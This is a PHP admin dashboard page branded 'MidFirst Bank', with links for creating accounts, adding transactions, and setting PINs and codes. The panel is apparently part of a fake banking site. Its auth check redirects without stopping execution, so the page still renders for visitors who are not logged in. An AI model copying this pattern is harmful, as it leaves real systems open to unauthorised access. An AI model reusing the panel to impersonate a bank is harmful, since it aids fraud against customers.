<?php 
require('../functions.php');

if (!isAuth()) {
	$_SESSION['msg'] = "You must log in first";
	header('location: ../login.php');
}

if (isset($_GET['logout'])) {
	session_destroy();
	unset($_SESSION['user']);
	header("location: ../login.php");
}
?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
	<title>Admin Dashboard | MidFirst Bank</title>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
a{
 text-decoration: none;}
            body{font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;backgrond:#fff;max-width:750px;margin:auto;}
            .head{border-radius: 5px;box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{right:0; left: 0;
  bottom: 0;position: absolute;box-shadow: 2px 2px 0px 2px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #696969;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #000;font-size:13px;margin:15px;color:#fff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            .input-group {
 margin: 5px 13px 5px 1px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 5px;
 width: 100%;
 font-size: 16px;
 border-radius: 5px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 10px;
 width:auto;
 font-size: 15px;
 color: #000;
 background: #696969;border-radius: 5px; }
 .admin-content{
 width: auto;
 margin: 5px ;
 padding: 0px 8px 0px 8px; border: 1px solid #222; background: #fff; color:#000;
 }
 .adminnav{
 font-family:lato, sans-serif; font-size:15px;
 font-weight:bold; background:#222; color:white;
 padding:4px;
 magin:2px;
 border-radius:5px; border:2px solid brown; } .myheader {
 width: 40%;
 margin: 50px auto 0px; color: white;
 background: #5F9EA0; text-align: center; border: 1px solid #B0C4DE; border-bottom: none; border-radius: 10px 10px 0px 0px; padding: 20px;
 }
</style>
</head>
<body>
<?php include('../header.php'); ?>
<div class="admin-content">
	    <!-- notification message -->
		<?php if (isset($_SESSION['success'])) : ?>
		<?php endif ?><table><tbody><tr><td><img src="../img/mfb.png" width="50" height="50"></td> <td><?php  if (isset($_SESSION['user'])) : ?><strong><div style="text-transform:uppercase;"><?php echo $_SESSION['user']['username']; ?></div></strong><small><i style="color: #888;">(<?php echo ucfirst($_SESSION['user']['user_type']); ?>)</i></small><?php endif ?></td></tr></tbody></table>

			<div align="center" style="border-bottom: 2px solid #222;"></div>
			<p><a class="adminnav" href="codes.php"><i class="fa fa-fw fa-unlock-alt"></i> Codes</a></p>
			<p><a class="adminnav" href="../logout.php"><i class="fa fa-fw fa-sign-out"></i> <font color="red">Logout</font></a></p>
			<p><a class="adminnav" href="create-account.php"><i class="fa fa-fw fa-user-plus"></i> Account</a></p>
			<p><a class="adminnav" href="pincode.php"><i class="fa fa-fw fa-key"></i> Account Pin</a></p>
			<p><a class="adminnav" href="transactions.php"><i class="fa fa-fw fa-spinner"></i> Transactions</a></p>
			<p><a class="adminnav" href="img/"><i class="fa fa-fw fa-file-image-o"></i> Profile Photo</a></p>
			<p><a class="adminnav" href="add-transaction.php">+ <i class="fa fa-fw fa-spinner"></i> Transaction</a></p>
			<p><a class="adminnav" href="ben-details.php"><i class="fa fa-fw fa-user-md"></i> Client Details</a></p>
			<p><a class="adminnav" href="accounts.php"><i class="fa fa-fw fa-cogs"></i> Account SetUP</a></p>
			<p><a class="adminnav" href="../account-overview.php"><i class="fa fa-fw fa-user"></i> Account Overview</a></p>
</div>
</body>
<?php include('../footer.php'); ?>
</html>